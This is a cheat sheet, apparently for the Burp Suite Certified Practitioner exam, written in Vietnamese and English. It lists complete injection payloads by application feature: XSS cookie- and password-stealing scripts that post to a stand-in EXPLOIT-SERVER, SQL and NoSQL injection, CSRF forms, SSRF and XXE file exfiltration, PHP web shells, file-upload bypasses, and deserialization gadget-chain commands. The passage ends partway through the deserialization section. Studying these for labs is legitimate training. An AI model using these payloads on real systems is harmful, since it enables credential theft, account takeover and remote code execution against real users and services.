# BSCP - Injection Points by Feature (Full Payloads)

> Khi vào lab thấy chức năng gì -> inject vào đâu -> payload đầy đủ
> Focus: PRACTITIONER level

---

## Table of Contents

1. [Search Box](#1-search-box)
2. [Login Page](#2-login-page)
3. [Product Listing / Category Filter](#3-product-listing--category-filter)
4. [Shopping Cart / Checkout](#4-shopping-cart--checkout)
5. [File Upload](#5-file-upload)
6. [Comment / Post / Feedback Form](#6-comment--post--feedback-form)
7. [Email Change](#7-email-change)
8. [Password Change / Reset](#8-password-change--reset)
9. [Stock Check](#9-stock-check)
10. [User Profile / My Account](#10-user-profile--my-account)
11. [Cookie / Session](#11-cookie--session)
12. [Live Chat / WebSocket](#12-live-chat--websocket)
13. [API Endpoint](#13-api-endpoint)
14. [Admin Panel](#14-admin-panel)
15. [Redirect / Return URL](#15-redirect--return-url)
16. [XML / SOAP Input](#16-xml--soap-input)
17. [Template / Render User Input](#17-template--render-user-input)
18. [Cache Behavior](#18-cache-behavior)
19. [OAuth / Social Login](#19-oauth--social-login)
20. [JWT Token](#20-jwt-token)
21. [HTTP Request Headers](#21-http-request-headers)

---

## 1. Search Box

### Reflected XSS

**HTML context (không encode gì):**
```html
<script>alert(1)</script>
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

**Attribute context (angle brackets encoded):**
```html
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
" accesskey="x" onclick="alert(1)
```

**JS string context (angle brackets encoded):**
```javascript
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
</script><script>alert(1)</script>
```

**Template literal context:**
```javascript
${alert(1)}
${document.domain}
```

**AngularJS (check ng-app in source):**
```
{{$eval.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
```

**Tag/event blocked bypass:**
```html
<svg><animatetransform onbegin=alert(1) attributeName=x dur=1s>
<xss id=x onfocus=alert(1) tabindex=1>
<body onresize=print()>
<iframe src="https://TARGET/?search=%3Cbody+onresize%3Dprint()%3E" onload=this.style.width='100px'>
```

**DOM XSS (check JS sinks in page source):**
```javascript
// document.write sink
"><script>alert(1)</script>
"><img src=1 onerror=alert(1)>

// innerHTML sink (script tag NO work)
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>

// eval / setTimeout / setInterval sink
1;alert(1)//
a\"};alert(1);//

// jQuery html() / append() / $() sink
<img src=1 onerror=alert(1)>

// jQuery attr() sink (href/src)
javascript:alert(1)

// jQuery selector sink + hashchange
<iframe src="https://TARGET/#" onload="this.src+='<img src=1 onerror=print()>'">

// location / window.open sink
javascript:alert(1)
https://attacker.com
```

**Steal cookies:**
```html
<script>fetch('https://EXPLOIT/steal?c='+document.cookie)</script>
<script>document.location='https://EXPLOIT/steal?c='+document.cookie</script>
<script>new Image().src='https://EXPLOIT/steal?c='+document.cookie</script>
```

**Steal password (auto-fill):**
```html
<input name=username id=username>
<input type=password name=password onchange="fetch('https://EXPLOIT/?p='+username.value+':'+this.value)">
```

### SSTI (nếu input render bởi template)

```
{{7*7}}                          -> 49 = Jinja2/Twig
${7*7}                           -> 49 = FreeMarker
<%= 7*7 %>                       -> 49 = ERB
#{7*7}                           -> 49 = Slim
${{7*7}}                         -> 49 = Thymeleaf
```

### SQLi (nếu search query DB)

```sql
' OR 1=1--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
test' AND '1'='1
test' AND '1'='2           -- so sánh true vs false response
```

**Dấu hiệu nhận biết:**
- Input reflect nguyên -> XSS
- Input nằm trong `<script>` block -> JS injection
- Input trong attribute `value="..."` -> attribute escape
- `ng-app` trong HTML -> AngularJS expression
- Search result từ DB -> SQLi
- `{{7*7}}` = `49` -> SSTI

---

## 2. Login Page

### SQLi Auth Bypass
```sql
administrator'--
admin'--
' OR 1=1--
' OR 1=1 LIMIT 1--
admin' OR '1'='1'--
```

### Username Enumeration

**Response text differ:**
- "Invalid username" vs "Incorrect password"
- Subtly different: trailing space, period, wording

**Response timing:**
```
username=admin&password=aaaaaaa...aaaa   (200+ chars)
# Valid username = longer processing time
# Combine with X-Forwarded-For to bypass IP lock:
X-Forwarded-For: 1.1.1.{N}
```

**Account lock:**
```
# Bruteforce 5+ attempts per username
# Valid user -> "You have made too many login attempts"
# Invalid user -> "Invalid username or password"
```

### NoSQL Injection

**Auth bypass:**
```json
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
{"username":"admin","password":{"$gt":""}}
{"username":{"$in":["admin","administrator"]},"password":{"$ne":""}}
```

**Extract password (character by character):**
```
admin' && this.password[0]=='a' || 'a'=='b
admin' && this.password.length==8 || 'a'=='b
admin' && this.password.match(/^a.*/) || 'a'=='b
```

**Extract field names:**
```json
{"username":"admin","password":{"$ne":""},"$where":"Object.keys(this)[0].match('^.{0}a.*')"}
```

### JSON Array Password
```json
{"username":"carlos","password":["123456","password","12345678","qwerty","123456789","1234","abc123"]}
```

### 2FA Bypass

**Skip 2FA:**
```
Login as victim -> 2FA page loads -> manually navigate to /my-account
# Check: GET /my-account returns logged-in page
```

**Brute-force 2FA:**
```
# Login as attacker -> valid 2FA session
# Change cookie to victim's session value
# Brute-force 0000-9999 via Intruder
# Use macro to auto re-login if session invalidates
```

### Stay-Logged-In Cookie
```
# Decode: base64(username:md5(password))
# Example: Y2FybG9zOjIwMmNiOTYyYWM1OTA3NWI5NjRiMDcxNTJkMjM0Yjcw
# = carlos:202cb962ac59075b964b07152d234b70
# md5("123") = 202cb962ac59075b964b07152d234b70

# Brute-force: generate cookie for each password candidate
# XSS steal: <script>fetch('https://EXPLOIT/'+document.cookie)</script>
```

### Brute-force with IP lock bypass
```
# Alternate valid login between attack attempts:
wiener:peter    (valid - reset counter)
carlos:password1
wiener:peter    (valid - reset counter)  
carlos:password2
# ...
```

**Dấu hiệu nhận biết:**
- Different error messages -> username enum
- JSON body -> NoSQL injection / array password
- Remember me checkbox -> stay-logged-in cookie
- 2FA page sau login -> try skip / brute
- Account lock message -> user enum via lock
- Response time varies -> timing attack

---

## 3. Product Listing / Category Filter

### SQLi UNION Attack

**Find column count:**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--          # error = 2 columns
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

**Find string column:**
```sql
' UNION SELECT 'test',NULL--
' UNION SELECT NULL,'test'--
```

**Oracle (cần FROM dual):**
```sql
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT BANNER,NULL FROM v$version--
```

**List tables:**
```sql
' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables WHERE table_schema='public'--
-- Oracle:
' UNION SELECT TABLE_NAME,NULL FROM ALL_TABLES--
```

**List columns:**
```sql
' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name='users_xyz'--
-- Oracle:
' UNION SELECT COLUMN_NAME,NULL FROM ALL_TAB_COLUMNS WHERE table_name='USERS_XYZ'--
```

**Extract data:**
```sql
' UNION SELECT username,password FROM users_xyz--
' UNION SELECT NULL,username||'~'||password FROM users_xyz--
```

### Blind SQLi (TrackingId cookie)

**Conditional response ("Welcome back"):**
```sql
TrackingId=xyz' AND '1'='1                              -- Welcome back appears
TrackingId=xyz' AND '1'='2                              -- disappears = injectable

-- Extract password length:
xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--

-- Extract char by char:
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
xyz' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>64--
```

**Conditional error (200 vs 500):**
```sql
-- Oracle:
xyz' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)='a'--    -- 500
xyz' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)='a'--    -- 200

-- Extract:
xyz' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')='a'--
```

**Visible error (data leaks in error message):**
```sql
-- PostgreSQL:
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
-- Error: invalid input syntax for integer: "s3cr3tp4ss"
```

**Time delay:**
```sql
-- PostgreSQL:
'||pg_sleep(10)--
' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--

-- MySQL:
' AND SLEEP(10)--%20
' AND IF(SUBSTRING(password,1,1)='a',SLEEP(10),0) FROM users WHERE username='administrator'--%20

-- Oracle:
' AND 1=(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN dbms_pipe.receive_message('a',10) ELSE 1 END FROM users WHERE username='administrator')--

-- MSSQL:
'; WAITFOR DELAY '0:0:10'--
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' WAITFOR DELAY '0:0:10'--
```

**OOB (Oracle, khi blind không work):**
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://COLLABORATOR/'||(SELECT password FROM users WHERE username='administrator')||'">%remote;]>'),'/l') FROM dual--
```

### NoSQL Injection
```
category=fizzy'||1==1%00                      -- show all
category=fizzy'||1==1||'                      -- alternative
category=fizzy'+%26%26+1==1%00                -- AND true
```

### XML WAF bypass (SQLi qua XML body)
```xml
<!-- Encode keywords in decimal HTML entities -->
<storeId>
&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;username,password&#32;&#70;&#82;&#79;&#77;&#32;users
</storeId>
<!-- = UNION SELECT username,password FROM users -->
```

**Dấu hiệu nhận biết:**
- Category filter -> SQLi UNION (classic)
- TrackingId cookie + "Welcome back" text -> Blind SQLi conditional
- TrackingId + 500 error -> Blind SQLi conditional error
- TrackingId + no visible diff -> Time-based blind
- Error message hiện data -> Visible error SQLi
- XML body + WAF -> entity-encoded SQLi

---

## 4. Shopping Cart / Checkout

### Business Logic - Price/Quantity

**Client-side price:**
```http
POST /cart HTTP/1.1
productId=1&redir=PRODUCT&quantity=1&price=1   # change price to 1 cent
```

**Negative quantity:**
```http
POST /cart HTTP/1.1
productId=2&quantity=-50    # negative = negative price = credit
# Buy target product qty=1 + others qty=-N to reduce total
# Total must remain > 0
```

**Integer overflow:**
```
# Add quantity to overflow 32-bit signed int
# 2147483647 / price_in_cents = how many to add
# Price wraps to negative -> add more items to bring total positive but cheap
```

### Coupon / Discount

**Race condition (send parallel):**
```
# Burp Repeater -> select multiple tabs -> Send group (parallel)
# Same coupon applied multiple times before server checks
POST /cart/coupon
csrf=xxx&coupon=PROMO20
```

**Alternating coupons:**
```
Apply NEWCUST5 -> Apply SIGNUP30 -> Apply NEWCUST5 -> Apply SIGNUP30
# Repeat until price = $0
# Each code "not already applied" after using the other
```

**Gift card + coupon loop:**
```
1. Buy $10 gift card with 30% coupon -> pay $7
2. Redeem gift card -> get $10 credit
3. Net gain: +$3 per cycle
4. Repeat via Intruder/macro
```

### Mass Assignment
```http
# Step 1: GET request reveals hidden fields
GET /api/checkout HTTP/1.1
# Response: {"price":1337,"chosen_discount":0,"chosen_shipping":"standard"}

# Step 2: Add hidden field to POST
POST /api/checkout HTTP/1.1
{"price":1337,"chosen_discount":100}
# or: {"chosen_discount":{"percentage":100}}
```

### Skip Workflow Step
```
# Multi-step checkout:
# Step 1: /cart -> Step 2: /cart/payment -> Step 3: /cart/confirm
# Skip to: GET /cart/order-confirmation?order-confirmed=true
```

**Dấu hiệu nhận biết:**
- Price/quantity trong POST body -> modify
- 2 coupon codes available -> alternating
- Coupon field + single use -> race condition
- Gift card + discount -> infinite money
- GET /api returns extra fields -> mass assignment
- Multi-step process -> skip to final

---

## 5. File Upload

### Web Shell Payloads

**PHP:**
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
<?php system($_GET['cmd']); ?>
<?php echo shell_exec('cat /home/carlos/secret'); ?>
```

**JSP:**
```jsp
<% Runtime rt = Runtime.getRuntime(); String[] cmd = {"/bin/cat", "/home/carlos/secret"}; Process p = rt.exec(cmd); java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A"); out.print(s.hasNext() ? s.next() : ""); %>
```

**ASP:**
```asp
<%= CreateObject("Scripting.FileSystemObject").OpenTextFile("/home/carlos/secret").ReadAll() %>
```

### Bypass Techniques

**Content-Type only check:**
```http
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg    # <-- change this, keep .php filename

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Path traversal in filename:**
```http
# Server blocks execution in /uploads/ dir
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
# or: filename="../shell.php"
# or: filename="....//shell.php"
# File saved outside upload dir -> execute normally
```

**Extension blacklist bypass (.htaccess):**
```
# Step 1: upload .htaccess
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .rce

# Step 2: upload shell.rce
Content-Disposition: form-data; name="avatar"; filename="shell.rce"

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Other config files:**
```
# IIS: web.config
<configuration>
<system.webServer>
<handlers>
<add name="RCE" path="*.rce" verb="*" modules="IsapiModule" scriptProcessor="C:\Windows\system32\inetsrv\asp.dll" />
</handlers>
</system.webServer>
</configuration>
```

**Extension whitelist bypass (null byte):**
```http
Content-Disposition: form-data; name="avatar"; filename="shell.php%00.jpg"
# Server validates .jpg extension
# Saves as shell.php (null byte truncates)
```

**Other extension tricks:**
```
shell.php.jpg          # double extension
shell.php5             # alternative PHP extension
shell.phtml
shell.pHp              # case variation
shell.php.            # trailing dot (Windows)
shell.php%20           # trailing space
shell.php....          # multiple dots
shell.shtml            # SSI
```

**Magic bytes / polyglot:**
```bash
# Inject PHP into image EXIF
exiftool -Comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" image.jpg -o polyglot.php

# Manual: prepend real JPEG header
echo -ne '\xff\xd8\xff\xe0' > polyglot.php
echo '<?php echo file_get_contents("/home/carlos/secret"); ?>' >> polyglot.php
```

**SVG with XXE:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///home/carlos/secret">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**PHAR deserialization:**
```
# Upload polyglot JPG/PHAR
# Trigger via: phar://uploads/avatar.jpg/test.txt
# Requires known gadget chain in PHP app
```

**Dấu hiệu nhận biết:**
- Avatar upload -> web shell
- Only checks Content-Type -> change header
- Blocks execution in dir -> path traversal filename
- Blocks .php -> .htaccess + custom extension
- Checks extension list -> null byte / double extension
- Checks file content/magic -> polyglot
- Accepts SVG/XML -> XXE via upload

---

## 6. Comment / Post / Feedback Form

### Stored XSS

**Basic (no filter):**
```html
<script>alert(1)</script>
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

**Script tag blocked:**
```html
<img src=1 onerror=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<video src=1 onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<select autofocus onfocus=alert(1)>
```

**Only first occurrence stripped:**
```html
<><img src=1 onerror=alert(1)>
```

**In name field:**
```html
<script>alert(1)</script>
```

**In website/URL field (href context):**
```html
javascript:alert(1)
javascript:fetch('https://EXPLOIT/'+document.cookie)
```

**In email field:**
```html
"><svg onload=alert(1)>@test.com
```

### Stored XSS -> Steal Data

**Cookie exfil (store in comment, victim views page):**
```html
<script>
fetch('https://EXPLOIT-SERVER/steal', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
});
</script>
```

**Password capture:**
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://EXPLOIT-SERVER/steal',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">
```

**CSRF via stored XSS (bypass same-origin CSRF protection):**
```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post','/my-account/change-email',true);
    changeReq.send('csrf='+token+'&email=attacker@evil.com');
};
req.open('get','/my-account',true);
req.send();
</script>
```

### CSRF on Feedback/Comment Form

**No CSRF token:**
```html
<form method="POST" action="https://TARGET/post/comment">
    <input type="hidden" name="postId" value="1">
    <input type="hidden" name="comment" value="hacked">
    <input type="hidden" name="name" value="attacker">
    <input type="hidden" name="email" value="a@a.com">
</form>
<script>document.forms[0].submit();</script>
```

### Dangling Markup

**Steal CSRF token / form data (when XSS partially blocked):**
```html
"><img src='//EXPLOIT-SERVER/steal?
```
Unclosed attribute captures everything until next `'` in page source.

### HTML Injection

**Inject phishing form:**
```html
<form action="https://EXPLOIT-SERVER/steal" method="POST">
    <label>Password:</label>
    <input type="password" name="password">
    <button>Login</button>
</form>
```

**Dấu hiệu nhận biết:**
- Comment shows on page -> Stored XSS
- `<script>` blocked -> event handler payloads
- Only first `<>` stripped -> `<><img...>`
- Website field in `href=` -> `javascript:` payload
- Form no CSRF token -> CSRF auto-submit
- Partial filter -> dangling markup

---

## 7. Email Change

### CSRF Payloads

**No defense:**
```html
<form method="POST" action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

**Token removed:**
```html
<!-- Same as above, just don't include csrf param -->
```

**Method switch (POST -> GET):**
```html
<script>
document.location='https://TARGET/my-account/change-email?email=attacker@evil.com';
</script>
```

**Reuse own token (not tied to session):**
```html
<form method="POST" action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="YOUR_VALID_TOKEN">
</form>
<script>document.forms[0].submit();</script>
```

**Token tied to non-session cookie (CRLF inject csrfKey):**
```html
<form method="POST" action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="YOUR_TOKEN_MATCHING_YOUR_CSRFKEY">
</form>
<img src="https://TARGET/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

**Token duplicated in cookie:**
```html
<form method="POST" action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="fake_token">
</form>
<img src="https://TARGET/?search=test%0d%0aSet-Cookie:%20csrf=fake_token%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

### SameSite Bypass

**Lax + method override:**
```html
<script>
document.location='https://TARGET/my-account/change-email?email=attacker@evil.com&_method=POST';
</script>
```

**Strict + client-side redirect:**
```html
<script>
document.location='https://TARGET/post/comment/confirmation?postId=1/../../my-account/change-email?email=attacker@evil.com%26submit=1';
</script>
```

**Lax + OAuth popup (cookie refresh):**
```html
<form method="POST" action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="YOUR_TOKEN">
</form>
<script>
window.onclick = () => {
    window.open('https://TARGET/social-login');
    setTimeout(() => document.forms[0].submit(), 5000);
}
</script>
Click anywhere on this page
```

### Referer Bypass

**Remove Referer entirely:**
```html
<meta name="referrer" content="no-referrer">
<form method="POST" action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

**Bypass contains-check:**
```html
<meta name="referrer" content="unsafe-url">
<script>
history.pushState("","","/?TARGET.com");
document.forms[0].submit();
</script>
```

### Clickjacking

**Basic overlay:**
```html
<style>
iframe{position:relative;width:1000px;height:700px;opacity:0.0001;z-index:2}
div{position:absolute;top:450px;left:80px;z-index:1}
</style>
<div>Click me</div>
<iframe src="https://TARGET/my-account?email=attacker@evil.com"></iframe>
```

**Frame buster bypass:**
```html
<iframe sandbox="allow-forms" src="https://TARGET/my-account?email=attacker@evil.com"></iframe>
```

### Business Logic

**Email domain restriction bypass (truncation):**
```
# 255 char limit on email
# Register: aaaa...aaa@dontwannacry.com.exploit-server.net
# After truncation: aaaa...aaa@dontwannacry.com
# -> Admin access
```

**Dấu hiệu nhận biết:**
- Change email form -> CSRF target (most common Stage 1)
- No CSRF token -> basic CSRF
- Token present but weak -> remove / reuse / method switch
- SameSite=Lax -> method override `_method=POST`
- SameSite=Strict -> find client-side redirect on same origin
- No X-Frame-Options -> clickjacking
- Email domain check -> truncation bypass

---

## 8. Password Change / Reset

### Host Header Poisoning

**Basic (forgot password form):**
```http
POST /forgot-password HTTP/1.1
Host: EXPLOIT-SERVER

username=administrator
# Reset email contains: https://EXPLOIT-SERVER/forgot-password?token=xxx
# Victim clicks -> token sent to attacker
```

**X-Forwarded-Host:**
```http
POST /forgot-password HTTP/1.1
Host: TARGET
X-Forwarded-Host: EXPLOIT-SERVER

username=administrator
```

**Dual Host:**
```http
POST /forgot-password HTTP/1.1
Host: TARGET
Host: EXPLOIT-SERVER

username=administrator
```

**Absolute URL + Host:**
```http
POST https://TARGET/forgot-password HTTP/1.1
Host: EXPLOIT-SERVER

username=administrator
```

### Logic Flaws

**Change username in reset POST:**
```http
POST /forgot-password HTTP/1.1

username=administrator&new-password=hacked123
# No token validation -> password changed
```

**Remove current_password:**
```http
POST /my-account/change-password HTTP/1.1

# Original: username=wiener&current-password=peter&new-password=test&confirm-password=test
# Modified:
username=administrator&new-password=hacked&confirm-password=hacked
# Removed current-password param entirely
```

### Token Leak via Referer

```
# User clicks reset link: https://TARGET/reset?token=abc123
# Page loads external resource (image, JS)
# Referer header sends: https://TARGET/reset?token=abc123 to external domain
# Check Burp Collaborator / exploit server logs
```

### Middleware SSRF for password reset

```http
POST /forgot-password HTTP/1.1
X-Forwarded-Host: EXPLOIT-SERVER
X-Host: EXPLOIT-SERVER
X-Forwarded-Server: EXPLOIT-SERVER
X-HTTP-Host-Override: EXPLOIT-SERVER
Forwarded: host=EXPLOIT-SERVER
```

**Dấu hiệu nhận biết:**
- Forgot password feature -> Host header poisoning (classic Stage 2)
- Change password without re-auth -> logic flaw
- Reset token in URL + external resources -> Referer leak
- Password reset email -> check domain in link

---

## 9. Stock Check

### SSRF Payloads

**Basic (stockApi param):**
```
stockApi=http://localhost/admin
stockApi=http://localhost/admin/delete?username=carlos
stockApi=http://127.0.0.1/admin
stockApi=http://[::1]/admin
```

**Internal network scan:**
```
stockApi=http://192.168.0.1:8080/admin
stockApi=http://192.168.0.2:8080/admin
# ... scan 1-255 via Intruder
stockApi=http://10.0.0.1/admin
stockApi=http://172.16.0.1/admin
```

**Blacklist bypass:**
```
http://127.1/admin                   # short IP
http://127.0.0.1/%2561dmin          # double URL encode 'a'
http://2130706433/admin              # decimal IP (127.0.0.1)
http://017700000001/admin            # octal IP
http://127.0.0.1.nip.io/admin       # DNS rebinding
http://127.1/%25%36%31dmin           # triple encode
http://0x7f000001/admin              # hex IP
http://0177.0.0.1/admin              # mixed octal
http://localhost/ADMIN               # case change
```

**Whitelist bypass:**
```
http://localhost%23@stock.target.net/admin       # # fragment
http://localhost%2523@stock.target.net/admin     # double encode #
http://localhost@stock.target.net/admin          # @ credentials
http://stock.target.net.attacker.com/admin      # subdomain
```

**Open redirect chain:**
```
stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin
# Server follows redirect to internal URL
```

**Blind SSRF (no response):**
```
Referer: http://192.168.0.X:8080    # Burp Collaborator
```

**Blind SSRF + Shellshock RCE:**
```http
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).COLLABORATOR
Referer: http://192.168.0.X:8080
# Scan internal IPs -> Shellshock on internal server -> RCE
```

### XXE via Stock Check XML Body

**Direct file read:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

**SSRF via XXE:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

**Blind XXE OOB:**
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://EXPLOIT-SERVER/dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

External DTD (on exploit server):
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR/?x=%file;'>">
%eval;
%exfil;
```

**Error-based XXE:**
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**XInclude (khi không control DOCTYPE):**
```xml
<stockCheck>
<productId><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo></productId>
<storeId>1</storeId>
</stockCheck>
```

**Repurpose local DTD:**
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///home/carlos/secret">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

**Dấu hiệu nhận biết:**
- stockApi=URL -> SSRF
- stockApi body=XML -> XXE
- Cannot add DOCTYPE -> XInclude
- No direct response -> Blind SSRF / Blind XXE OOB
- WAF blocks entities -> repurpose local DTD

---

## 10. User Profile / My Account

### Web Cache Deception

**Path mapping (REST vs traditional):**
```
/my-account/nonexistent.js        # cache thinks .js = static
/my-account/anything.css
/my-account/x.avif
```

**Delimiter-based:**
```
/my-account;wcd.js                # Java Spring: ; is delimiter
/my-account%3fwcd.css             # %3f = ? -> server returns /my-account
/my-account%23wcd.css             # %23 = # -> server ignores fragment
/my-account.ico                   # Ruby on Rails
/my-account%00.js                 # null byte
```

**Origin server normalization:**
```
/resources/..%2fmy-account        # origin normalizes path, cache sees /resources/*
/static/..%2fmy-account
/assets/..%2fmy-account
```

**Cache server normalization:**
```
/my-account%2f%2e%2e%2fresources     # cache normalizes to /resources, origin sees /my-account...
/my-account%23%2f%2e%2e%2fresources
```

**Attack flow:**
```
1. Craft URL: https://TARGET/my-account/x.js
2. Send URL to victim (exploit server)
3. Victim visits -> response cached with their data
4. Attacker visits same URL -> gets cached sensitive data (API key, CSRF token)
5. Check: X-Cache: hit = success
```

### IDOR

```
/my-account?id=carlos
/my-account?id=administrator
/api/user/2                     # increment ID
/api/user/carlos
/download/2.txt                 # change file ID
```

**GUID leak:**
```
# Find GUID in: blog posts, comments, API responses, HTML source
# Then: /my-account?id=discovered-guid
```

### CORS Exploitation

```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    location = '/log?key=' + this.responseText;
};
req.open('get', 'https://TARGET/accountDetails', true);
req.withCredentials = true;
req.send();
</script>
```

**Null origin:**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
var r=new XMLHttpRequest();
r.onload=function(){location='https://EXPLOIT/log?d='+this.responseText};
r.open('get','https://TARGET/accountDetails',true);
r.withCredentials=true;
r.send();
</script>"></iframe>
```

**Trusted subdomain XSS chain:**
```
# Find XSS on http://subdomain.TARGET
# Use XSS to read /accountDetails (same origin policy allows subdomains if CORS trusts *.TARGET)
```

### Prototype Pollution (JSON profile update)

```json
{"username":"wiener","__proto__":{"isAdmin":true}}
{"username":"wiener","constructor":{"prototype":{"isAdmin":true}}}
```

### Mass Assignment

```http
# GET /api/user returns: {"username":"wiener","email":"w@w.com","roleid":1}
# POST /api/user with: {"username":"wiener","email":"w@w.com","roleid":2}
# or: {"roleid":2,"isAdmin":true,"admin":true}
```

**Dấu hiệu nhận biết:**
- `/my-account` + `X-Cache` header -> Web Cache Deception
- `/my-account?id=` -> IDOR
- API returns `Access-Control-Allow-Origin` -> CORS
- JSON update endpoint -> prototype pollution / mass assignment

---

## 11. Cookie / Session

### Deserialization Detection

**PHP serialized (O: prefix):**
```
# Cookie decoded:
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}

# Change b:0 to b:1 for admin:
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}

# Change type for loose comparison bypass:
# access_token from s:"xxx" to i:0 (int 0 == any string in PHP)
s:12:"access_token";i:0;

# Delete file via avatar_link:
O:4:"User":3:{s:8:"username";s:6:"wiener";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";s:5:"admin";b:0;}
```

**PHP gadget chain (phpggc):**
```bash
# Find framework: error page, headers, cookies
# Find SECRET_KEY: phpinfo, debug page, source code leak
php phpggc Symfony/RCE4 exec 'cat /home/carlos/secret' | base64
php phpggc Laravel/RCE1 system 'cat /home/carlos/secret' | base64
php phpggc Monolog/RCE1 system 'cat /home/carlos/secret' | base64

# Sign with HMAC using SECRET_KEY
# Replace session cookie
```

**Java serialized (rO0 base64 / ac ed hex):**
```bash
# Generate payload with ysoserial
java -jar ysoserial.jar CommonsCollections4 'cat /home/carlos/secret' | base64
java -jar ysoserial.jar CommonsCollections1 'rm /home/carlos/morale.txt' | base64
